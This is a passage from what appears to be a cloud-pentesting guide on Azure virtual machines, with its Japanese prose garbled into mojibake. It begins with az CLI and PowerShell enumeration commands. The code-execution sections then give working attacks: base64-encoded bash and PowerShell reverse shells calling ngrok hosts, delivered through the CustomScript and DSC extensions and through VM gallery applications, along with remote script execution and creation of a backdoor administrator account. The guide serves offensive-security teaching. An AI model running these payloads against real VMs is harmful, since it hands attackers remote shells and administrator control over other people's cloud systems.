--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List bastions
Get-AzBastion
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿

Azure ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ ã‚µãƒ¼ãƒ“ã‚¹ (IMDS) **ã¯ã€å®Ÿè¡Œä¸­ã®ä»®æƒ³ãƒã‚·ãƒ³ ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’æä¾›ã—**ã€ç®¡ç†ã¨æ§‹æˆã‚’æ”¯æ´ã—ã¾ã™ã€‚SKUã€ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã€ä»Šå¾Œã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã‚¤ãƒ™ãƒ³ãƒˆã«é–¢ã™ã‚‹æƒ…å ±ãªã©ã®è©³ç´°ã‚’æä¾›ã—ã€**éãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚° IP ã‚¢ãƒ‰ãƒ¬ã‚¹ 169.254.169.254 ã§åˆ©ç”¨å¯èƒ½ãª REST API** ã‚’ä»‹ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã“ã‚Œã¯ VM å†…ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚VM ã¨ IMDS ã®é–“ã®é€šä¿¡ã¯ãƒ›ã‚¹ãƒˆå†…ã«ç•™ã¾ã‚Šã€å®‰å…¨ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’ç¢ºä¿ã—ã¾ã™ã€‚IMDS ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹éš›ã€VM å†…ã® HTTP ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯é©åˆ‡ãªé€šä¿¡ã‚’ç¢ºä¿ã™ã‚‹ãŸã‚ã«ã‚¦ã‚§ãƒ–ãƒ—ãƒ­ã‚­ã‚·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã•ã‚‰ã«ã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é€£çµ¡ã™ã‚‹ã«ã¯ã€HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒ˜ãƒƒãƒ€ãƒ¼ **`Metadata: true`** ã‚’å«ã‚ã€ãƒ˜ãƒƒãƒ€ãƒ¼ **`X-Forwarded-For`** ã‚’å«ã‚ã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚

ãã‚Œã‚’åˆ—æŒ™ã™ã‚‹æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## VM åˆ—æŒ™

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}
{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)

# Disks
## List all disks and get info about one
Get-AzDisk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>

# Snapshots
## List all galleries abd get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all snapshots and get info about one
Get-AzSnapshot
Get-AzSnapshot -Name <SnapshotName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>

# Bastion
## List bastions
Get-AzBastion

# Network
## List all VNets in your subscription
Get-AzVirtualNetwork

## List VNet peering connections for a given VNet
(Get-AzVirtualNetwork -ResourceGroupName <ResourceGroupName> -Name <VNetName>).VirtualNetworkPeerings

## List Shared Resources (e.g., Azure Firewall) in the Hub
Get-AzFirewall

## List VPN Gateways
Get-AzVirtualNetworkGateway -ResourceGroupName <ResourceGroupName>

## List VPN Connections
Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <ResourceGroupName>

## List ExpressRoute Circuits
Get-AzExpressRouteCircuit

# Misc
## List all virtual machine scale sets
Get-AzVmss

## List all availability sets
Get-AzAvailabilitySet

## List all load balancers
Get-AzLoadBalancer

## List all storage accounts
Get-AzStorageAccount

## List all custom script extensions on a specific VM
Get-AzVMExtension -VMName <VmName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## VMsã«ãŠã‘ã‚‹ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ

### VMæ‹¡å¼µæ©Ÿèƒ½

Azure VMæ‹¡å¼µæ©Ÿèƒ½ã¯ã€Azureä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ä¸Šã§ã®**ãƒ‡ãƒ—ãƒ­ã‚¤å¾Œã®æ§‹æˆ**ãŠã‚ˆã³è‡ªå‹•åŒ–ã‚¿ã‚¹ã‚¯ã‚’æä¾›ã™ã‚‹å°ã•ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã™ã€‚

ã“ã‚Œã«ã‚ˆã‚Šã€**VMå†…ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

å¿…è¦ãªæ¨©é™ã¯**`Microsoft.Compute/virtualMachines/extensions/write`**ã§ã™ã€‚

åˆ©ç”¨å¯èƒ½ãªã™ã¹ã¦ã®æ‹¡å¼µæ©Ÿèƒ½ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# It takes some mins to run
Get-AzVMExtensionImage -Location <Location> -PublisherName <PublisherName> -Type <Type>
```
{% endcode %}
{% endtab %}
{% endtabs %}


ã‚«ã‚¹ã‚¿ãƒ ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**ã‚«ã‚¹ã‚¿ãƒ æ‹¡å¼µæ©Ÿèƒ½ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**:

{% tabs %}
{% tab title="Linux" %}
* ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã«ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

ä»–ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™: `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* VMAccessæ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒªã‚»ãƒƒãƒˆã™ã‚‹

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### é–¢é€£ã™ã‚‹VMæ‹¡å¼µæ©Ÿèƒ½

å¿…è¦ãªæ¨©é™ã¯ä¾ç„¶ã¨ã—ã¦ **`Microsoft.Compute/virtualMachines/extensions/write`** ã§ã™ã€‚

<details>

<summary>VMAccessæ‹¡å¼µæ©Ÿèƒ½</summary>

ã“ã®æ‹¡å¼µæ©Ÿèƒ½ã¯ã€Windows VMå†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆã¾ãŸã¯å­˜åœ¨ã—ãªã„å ´åˆã¯ä½œæˆã™ã‚‹ï¼‰ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

ã“ã‚Œã¯ã€Azure Windows VMã®æ§‹æˆã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã«PowerShell DSCã‚’ä½¿ç”¨ã™ã‚‹Microsoftã«å±ã™ã‚‹**VMæ‹¡å¼µ**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æ‹¡å¼µã‚’é€šã˜ã¦Windows VMã§**ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼š
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ãƒ¯ãƒ¼ã‚«ãƒ¼</summary>

ã“ã‚Œã¯ã€ã‚ªãƒ¼ãƒˆãƒ¡ãƒ¼ã‚·ãƒ§ãƒ³ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰VMå†…ã§ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹VMæ‹¡å¼µã§ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[ã‚ªãƒ¼ãƒˆãƒ¡ãƒ¼ã‚·ãƒ§ãƒ³ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚µãƒ¼ãƒ“ã‚¹](../az-automation-account/)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

</details>

### VMã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

ã“ã‚Œã‚‰ã¯ã€VMå†…ã§ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç°¡å˜ã«è¿½åŠ ãŠã‚ˆã³å‰Šé™¤ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ‡ãƒ¼ã‚¿ãŠã‚ˆã³ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŠã‚ˆã³ã‚¢ãƒ³ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚’å«ã‚€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã§ã™ã€‚

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ‘ã‚¹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

æ–°ã—ã„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

{% hint style="danger" %}
**å€‹ã€…ã®ã‚¢ãƒ—ãƒªã‚„ã‚®ãƒ£ãƒ©ãƒªãƒ¼ã‚’ä»–ã®ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ã‚„ãƒ†ãƒŠãƒ³ãƒˆã¨å…±æœ‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚ã“ã‚Œã¯éå¸¸ã«èˆˆå‘³æ·±ã„ã“ã¨ã§ã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä»•æ›ã‘ã€ä»–ã®ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ã‚„ãƒ†ãƒŠãƒ³ãƒˆã«ãƒ”ãƒœãƒƒãƒˆã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

ã—ã‹ã—ã€**vmã‚¢ãƒ—ãƒªç”¨ã®ã€Œãƒãƒ¼ã‚±ãƒƒãƒˆãƒ—ãƒ¬ã‚¤ã‚¹ã€ã¯ã€æ‹¡å¼µæ©Ÿèƒ½ç”¨ã®ã‚‚ã®ã¨ã¯ç•°ãªã‚Šå­˜åœ¨ã—ã¾ã›ã‚“**ã€‚

å¿…è¦ãªæ¨©é™ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆä¾‹ï¼š

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
